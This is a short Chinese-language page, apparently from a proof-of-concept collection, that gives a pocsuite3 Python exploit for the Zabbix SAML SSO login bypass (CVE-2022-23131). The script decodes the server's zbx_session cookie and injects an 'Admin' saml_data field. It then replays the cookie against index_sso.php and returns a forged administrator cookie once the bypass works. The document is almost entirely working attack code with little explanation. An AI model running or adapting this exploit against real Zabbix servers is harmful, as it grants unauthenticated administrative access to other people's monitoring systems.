## Zabbix登录绕过漏洞（CVE-2022-23131）

> https://www.freebuf.com/vuls/323321.html
```
import re
from collections import OrderedDict
from pocsuite3.lib.utils import random_str
from pocsuite3.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port
from pocsuite3.lib.core.interpreter_option \
    import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
from pocsuite3.modules.listener import REVERSE_PAYLOAD
import base64
import json
from urllib.parse import unquote,quote

requests.packages.urllib3.disable_warnings()
class DemoPOC(POCBase):
    vulID = '0'                  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'                   # 默认为1
    author = 'Infiltrator'               # PoC作者的大名
    vulDate = '2022-2-25'          # 漏洞公开的时间,不知道就写今天
    createDate = '2021-8-20'       # 编写 PoC 的日期
    updateDate = '2021-9-12'       # PoC 更新的时间,默认和编写时间一样
    references = ['']      # 漏洞地址来源,0day不用写
    name = 'Zabbix SAML SSO 登录绕过漏洞（CVE-2022-23131）'   # PoC 名称
    appPowerLink = ''    # 漏洞厂商主页地址
    appName = '-'          # 漏洞应用名称
    appVersion = '-'          # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION      # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []                # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []       # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = '''
            在启用 SAML SSO 身份验证（非默认）的情况下，未经身份验证的攻击者可以通过修改Cookie数据，绕过身份认证获得对 Zabbix 前端的管理员访问权限。
        '''                     # 漏洞简要描述
    pocDesc = ''' 
            poc的用法描述 
        '''                     # POC用法描述

    def _options(self):
        opt = OrderedDict()     # value = self.get_option('key')
        return opt

    def _verify(self):
        output = Output(self)
        # 验证代码
        s=requests.Session()
        try:
            html=s.get(self.url,verify=False)
        except:
            output.fail('Could not get Cookie!')
            return output
        try:
            set_cookie=base64.b64decode(unquote(html.cookies['zbx_session'])).decode('utf8')
        except KeyError:
            output.fail('Could not find zbx_session in Cookies')
            return output

        set_cookie=json.loads(set_cookie)
        new_cookie=base64.b64encode(json.dumps({"saml_data":{"username_attribute":"Admin"},'sessionid':set_cookie['sessionid'],'sign':set_cookie['sign']}).encode('utf8')).decode('utf8')
        head={'Cookie':'zbx_session='+new_cookie}
        res=s.get(self.url+'/index_sso.php',headers=head,verify=False)
        
        if 'User settings' and 'Zabbix SIA' in res.text:
            result={}
            result["Cookie"]='zbx_session='+new_cookie
            output.success(result)
        return output

    def _attack(self):
        _verify()

# 注册 DemoPOC 类
register_poc(DemoPOC)
```
